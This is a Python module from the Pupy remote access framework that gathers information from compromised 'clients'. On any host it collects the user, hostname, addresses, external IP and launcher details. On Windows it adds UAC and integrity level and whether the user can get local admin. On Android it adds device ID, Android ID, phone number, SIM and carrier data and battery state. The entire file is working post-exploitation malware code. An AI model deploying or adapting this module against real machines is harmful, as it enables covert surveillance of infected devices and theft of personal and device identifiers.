# -*- coding: utf-8 -*-

from pupylib.PupyModule import config, PupyModule, PupyArgumentParser
from pupylib.PupyOutput import Table

__class_name__="GetInfo"

@config(cat="gather")
class GetInfo(PupyModule):
    """ get some informations about one or multiple clients """
    dependencies = {
        'windows': ['pupwinutils.security'],
        'android': ['pupydroid.utils']
    }

    @classmethod
    def init_argparse(cls):
        cls.arg_parser = PupyArgumentParser(
            prog='get_info',
            description=cls.__doc__
        )

    def run(self, args):
        commonKeys = [
            "hostname", "user", "release", "version",
            "os_arch", "proc_arch", "pid", "exec_path", "cid",
            "address", "macaddr", "spi", "revision", "node",
            "debug_logfile", "native", "proxy", "external_ip"
        ]
        pupyKeys = ["transport", "launcher", "launcher_args"]
        windKeys = ["uac_lvl","intgty_lvl"]
        linuxKeys = []
        macKeys = []

        infos = []

        for k in commonKeys:
            if k in self.client.desc:
                infos.append((k,self.client.desc[k]))

        if self.client.is_windows():
            for k in windKeys:
                infos.append((k,self.client.desc[k]))

            can_get_admin_access = self.client.remote(
                'pupwinutils.security', 'can_get_admin_access', False)

            currentUserIsLocalAdmin = can_get_admin_access()

            value = '?'
            if currentUserIsLocalAdmin:
                value = 'Yes'
            elif not currentUserIsLocalAdmin:
                value = 'No'

            infos.append(('local_adm', value))

        elif self.client.is_linux():
            for k in linuxKeys:
                infos.append((k, self.client.desc[k]))

        elif self.client.is_darwin():
            for k in macKeys:
                infos.append((k, self.client.desc[k]))

        elif self.client.is_android():
            utils = self.client.remote('pupydroid.utils')

            wifiConnected = utils.isWiFiConnected()
            if wifiConnected:
                androidCtionType = {'info':"WiFi", 'fast':True}
            else:
                androidCtionType = utils.getMobileNetworkType()

            infos.append(('ction_type', "{0} (fast:{1})".format(androidCtionType['info'], androidCtionType['fast'])))
            androidID = utils.getAndroidID()
            infos.append(("android_id",androidID))
            wifiEnabled = utils.isWiFiEnabled()
            infos.append(("wifi_enabled",wifiConnected or wifiEnabled))
            infoBuild = utils.getInfoBuild()
            infos.append(("device_name",infoBuild['deviceName']))
            infos.append(("manufacturer",infoBuild['manufacturer']))
            infos.append(("model",infoBuild['model']))
            infos.append(("product",infoBuild['product']))
            infos.append(("bootloader_version",infoBuild['bootloaderVersion']))
            infos.append(("radio_version",infoBuild['radioVersion']))
            infos.append(("release",infoBuild['release']))
            battery = utils.getBatteryStats()
            infos.append(("battery_%",battery['percentage']))
            infos.append(("is_charging",battery['isCharging']))
            simState = utils.getSimState()
            infos.append(("sim_state",simState))
            deviceId = utils.getDeviceId()
            infos.append(("device_id",deviceId))
            #Needs API level 23. When this API will be used, these 2 following line should be uncommented
            try:
                simInfo = utils.getSimInfo()
                infos.append(("sim_count",simInfo))
            except:
                pass

            if ("absent" not in simState) and ("unknown" not in simState):
                phoneNb = utils.getPhoneNumber()
                infos.append(("phone_nb",phoneNb))
                simCountryIso = utils.getSimCountryIso()
                infos.append(("sim_country",simCountryIso))
                networkCountryIso = utils.getNetworkCountryIso()
                infos.append(("network_country",networkCountryIso))
                networkOperatorName = utils.getNetworkOperatorName()
                infos.append(("network_operator",networkOperatorName))
                isNetworkRoaming = utils.isNetworkRoaming()
                infos.append(("is_roaming",isNetworkRoaming))
            else:
                #Print N/A when not applicable. These following lines can be removed from info if needed
                infos.append(("phone_nb","N/A"))
                infos.append(("sim_country","N/A"))
                infos.append(("network_country","N/A"))
                infos.append(("network_operator","N/A"))
                infos.append(("device_id","N/A"))

        for k in pupyKeys:
            if k in self.client.desc:
                infos.append((k, self.client.desc[k]))

        infos.append(('platform', '{}/{}'.format(
            self.client.platform, self.client.arch or '?'
        )))

        #For remplacing None or "" value by "?"
        infoTemp = []
        for i, (key, value) in enumerate(infos):
            if value is None or value == "":
                value = "?"
            elif type(value) in (list, tuple):
                value = ' '.join([unicode(x) for x in value])
            elif key == 'cid':
                value = '{:016x}'.format(value)
            infoTemp.append((key, value))

        infos = infoTemp

        table = [{
            'KEY': k,
            'VALUE': v
        } for k,v in infoTemp]

        self.log(Table(table, ['KEY', 'VALUE'], legend=False))
